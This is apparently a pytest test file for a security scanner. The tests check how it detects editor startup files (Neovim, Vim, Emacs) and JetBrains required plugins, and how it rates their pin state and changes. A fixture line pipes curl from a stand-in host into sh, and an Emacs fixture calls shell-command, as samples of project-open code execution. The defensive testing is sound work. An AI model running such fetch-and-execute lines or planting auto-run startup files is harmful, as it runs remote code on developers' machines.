"""Editor startup files and JetBrains required plugins."""

from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from controlloop.acbom import EdgeType, Node, host_node_id
from controlloop.adapters import (
    DiscoveryResult,
    EditorStartupAdapter,
    ScanContext,
    editor_startup,
    run_adapters,
)
from controlloop.adapters.claude_code import ComponentDiscovery
from controlloop.adapters.editor_startup import STARTUP_FILES, plugin_pin
from controlloop.adapters.framework import RepositoryFile
from controlloop.bom import build_acbom_document
from controlloop.diff.compute import compute_diff
from controlloop.findings.models import FindingChangeState, FindingSeverity
from controlloop.policy.models import RuleContext
from controlloop.policy.rules import (
    agent_hook_command_change_findings,
    unpinned_agent_component_findings,
)
from controlloop.policy.rules.hook_script_changed import (
    findings as hook_script_changed_findings,
)
from controlloop.repository import resolve_repository_root

_XML = ".idea/externalDependencies.xml"
_BODY = b'vim.fn.system("curl https://x.test | sh")\n'


def _write(root: Path, relative_path: str, content: str | bytes) -> None:
    target = root / relative_path
    target.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, bytes):
        target.write_bytes(content)
    else:
        target.write_text(content)


def _plugins_xml(*plugins: str, version: str = "4") -> str:
    body = "".join(f"    {plugin}\n" for plugin in plugins)
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<project version="{version}">\n'
        f'  <component name="ExternalDependencies">\n{body}  </component>\n'
        "</project>\n"
    )


def _run(root: Path) -> DiscoveryResult:
    return run_adapters(
        [EditorStartupAdapter()], ScanContext(root=resolve_repository_root(root))
    )


def _by_name(result: DiscoveryResult) -> dict[str, Node]:
    return {node.name: node for node in result.nodes}


def _context(head: Path, base: Path | None = None) -> RuleContext:
    current = build_acbom_document(resolve_repository_root(head))
    diff = None
    if base is not None:
        baseline = build_acbom_document(resolve_repository_root(base))
        diff = compute_diff(
            baseline_nodes=baseline.nodes,
            baseline_edges=baseline.edges,
            current_nodes=current.nodes,
            current_edges=current.edges,
        )
    return RuleContext(acbom=current, policy_version="test", diff=diff)


def _repos(tmp_path: Path) -> tuple[Path, Path]:
    base, head = tmp_path / "base", tmp_path / "head"
    base.mkdir()
    head.mkdir()
    return base, head


class TestStartupFiles:
    @pytest.mark.parametrize(
        ("path", "host"),
        [
            (".nvim.lua", "Neovim"),
            (".nvimrc", "Neovim"),
            (".exrc", "Vim"),
            (".lvimrc", "Vim"),
            (".dir-locals.el", "Emacs"),
            (".dir-locals-2.el", "Emacs"),
        ],
    )
    def test_each_file_is_a_project_open_command_with_its_digest(
        self, tmp_path: Path, path: str, host: str
    ) -> None:
        _write(tmp_path, path, _BODY)

        result = _run(tmp_path)

        (node,) = [n for n in result.nodes if n.subtype == "helper-command"]
        assert node.attributes["setting"] == path
        assert node.attributes["command"] == path
        assert node.attributes["event"] == "project-open"
        assert node.attributes["script_path"] == path
        assert node.attributes["script_digest"] == (
            "sha256:" + hashlib.sha256(_BODY).hexdigest()
        )
        assert node.security_attributes.code_execution is True
        holder = _by_name(result)[host]
        assert any(
            edge.source == holder.id
            and edge.target == node.id
            and edge.type is EdgeType.INVOKES
            for edge in result.edges
        )

    def test_the_file_content_is_never_recorded(self, tmp_path: Path) -> None:
        _write(tmp_path, ".nvim.lua", _BODY)

        result = _run(tmp_path)

        recorded = "\n".join(
            item.model_dump_json() for item in (*result.nodes, *result.edges)
        )
        assert "curl" not in recorded

    def test_only_the_root_is_read(self, tmp_path: Path) -> None:
        for path in STARTUP_FILES:
            _write(tmp_path, f"sub/{path}", _BODY)
        _write(tmp_path, "nvim/init.lua", _BODY)
        _write(tmp_path, ".vimrc", _BODY)

        result = _run(tmp_path)

        assert result.nodes == ()
        assert result.diagnostics == ()


class TestRequiredPlugins:
    @pytest.mark.parametrize(
        ("minimum", "maximum", "pinned"),
        [
            ("1.2.3", "1.2.3", True),
            ("1.0", "2.0", False),
            ("1.0", None, False),
            (None, "2.0", False),
            (None, None, "unknown"),
            ("<ide.build.baseline>", "<ide.build.baseline>", False),
        ],
    )
    def test_plugin_pin(
        self, minimum: str | None, maximum: str | None, pinned: object
    ) -> None:
        assert plugin_pin(minimum, maximum) == pinned

    def test_exact_range_and_unbounded_plugins(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _XML,
            _plugins_xml(
                '<plugin id="org.jetbrains.kotlin" min-version="2.0.0" '
                'max-version="2.0.0" />',
                '<plugin id="com.intellij" min-version="262.8665.258" />',
                '<plugin id="Git4Idea" />',
            ),
        )

        result = _run(tmp_path)
        nodes = _by_name(result)

        exact = nodes["editor plugin org.jetbrains.kotlin"]
        assert exact.attributes["source_type"] == "editor-extension"
        assert exact.attributes["ref"] == "2.0.0"
        assert exact.security_attributes.pinned is True
        ranged = nodes["editor plugin com.intellij"]
        assert ranged.attributes["min_version"] == "262.8665.258"
        assert "max_version" not in ranged.attributes
        assert ranged.attributes["ref"] == "min 262.8665.258"
        assert ranged.security_attributes.pinned is False
        unbounded = nodes["editor plugin Git4Idea"]
        assert "ref" not in unbounded.attributes
        assert unbounded.security_attributes.pinned == "unknown"
        jetbrains = host_node_id("jetbrains")
        assert nodes["JetBrains IDEs"].id == jetbrains
        assert {e.type for e in result.edges if e.source == jetbrains} == {
            EdgeType.RECEIVES_FROM
        }

    def test_an_idea_folder_without_the_file_is_silent(self, tmp_path: Path) -> None:
        _write(tmp_path, ".idea/misc.xml", _plugins_xml('<plugin id="x" />'))

        result = _run(tmp_path)

        assert result.nodes == ()
        assert result.diagnostics == ()

    @pytest.mark.parametrize(
        "content",
        [
            "<project><component",
            '<?xml version="1.0"?>\n<!DOCTYPE project [<!ENTITY x "y">]>\n'
            '<project version="4"><component name="ExternalDependencies">'
            '<plugin id="&x;" /></component></project>',
            _plugins_xml('<plugin id="x" />', version="5"),
            "<settings />",
            _plugins_xml("<plugin />"),
        ],
    )
    def test_unreadable_xml_is_a_diagnostic(self, tmp_path: Path, content: str) -> None:
        _write(tmp_path, _XML, content)

        result = _run(tmp_path)

        assert result.nodes == ()
        assert [d.code for d in result.diagnostics] == ["INCOMPLETE-UNPARSED-REGION"]

    def test_utf16_is_refused_before_parsing(self, tmp_path: Path) -> None:
        # The walker already skips a file with NUL bytes as binary; the
        # adapter refuses one too, since UTF-16 would hide a declaration.
        _write(tmp_path, _XML, _plugins_xml('<plugin id="x" />').encode("utf-16"))
        found = ComponentDiscovery(_XML, host_node_id("jetbrains"), "editor-startup")

        parsed = editor_startup._parse(found, RepositoryFile(tmp_path / _XML, _XML))

        assert parsed is None
        assert [d.code for d in found.diagnostics] == ["INCOMPLETE-UNPARSED-REGION"]


class TestExistingRulesReportTheseEntries:
    """No rule changes: the entries arrive in shapes the rules already read."""

    def test_a_first_scan_reports_a_startup_file_once_at_low(
        self, tmp_path: Path
    ) -> None:
        _write(tmp_path, ".nvim.lua", _BODY)

        (finding,) = agent_hook_command_change_findings(_context(tmp_path))

        assert finding.severity is FindingSeverity.LOW
        assert finding.change_state is FindingChangeState.NOT_COMPARED
        assert finding.message == (
            "Setting '.nvim.lua' for host 'Neovim' runs `.nvim.lua`. "
            "Recorded on a scan with no baseline."
        )

    def test_an_added_startup_file_is_high(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(head, ".dir-locals.el", '((nil . ((eval . (shell-command "x")))))\n')

        (finding,) = agent_hook_command_change_findings(_context(head, base))

        assert finding.severity is FindingSeverity.HIGH
        assert finding.change_state is FindingChangeState.ADDED
        assert "host 'Emacs'" in finding.message
        assert "shell-command" not in finding.message

    def test_a_changed_startup_file_is_reported_by_its_digest(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        _write(base, ".nvim.lua", "vim.opt.tabstop = 4\n")
        _write(head, ".nvim.lua", _BODY)
        context = _context(head, base)

        (finding,) = hook_script_changed_findings(context)

        assert finding.severity is FindingSeverity.HIGH
        assert finding.message == (
            "Setting '.nvim.lua' for host 'Neovim' runs `.nvim.lua`, whose "
            "contents changed while the command did not."
        )
        assert "curl" not in finding.message
        assert agent_hook_command_change_findings(context) == ()

    def test_required_plugins_are_reported_by_pin_state(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(base, _XML, _plugins_xml())
        _write(
            head,
            _XML,
            _plugins_xml(
                '<plugin id="com.acme.exact" min-version="1.0" max-version="1.0" />',
                '<plugin id="com.acme.range" min-version="1.0" max-version="2.0" />',
                '<plugin id="com.acme.any" />',
            ),
        )

        findings = unpinned_agent_component_findings(_context(head, base))

        assert sorted((f.message, f.severity) for f in findings) == [
            (
                "Added: Editor plugin com.acme.any (editor-extension) has no pin "
                "this repository can verify; its source is resolved elsewhere.",
                FindingSeverity.MEDIUM,
            ),
            (
                "Added: Editor plugin com.acme.exact (editor-extension) is pinned.",
                FindingSeverity.LOW,
            ),
            (
                "Added: Editor plugin com.acme.range (editor-extension) has no "
                "commit or digest pin.",
                FindingSeverity.MEDIUM,
            ),
        ]

    def test_a_widened_version_bound_is_a_changed_pin(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(
            base,
            _XML,
            _plugins_xml(
                '<plugin id="com.acme.p" min-version="1.0" max-version="1.0" />'
            ),
        )
        _write(head, _XML, _plugins_xml('<plugin id="com.acme.p" min-version="1.0" />'))

        (finding,) = unpinned_agent_component_findings(_context(head, base))

        assert finding.change_state is FindingChangeState.CHANGED
        assert finding.severity is FindingSeverity.MEDIUM
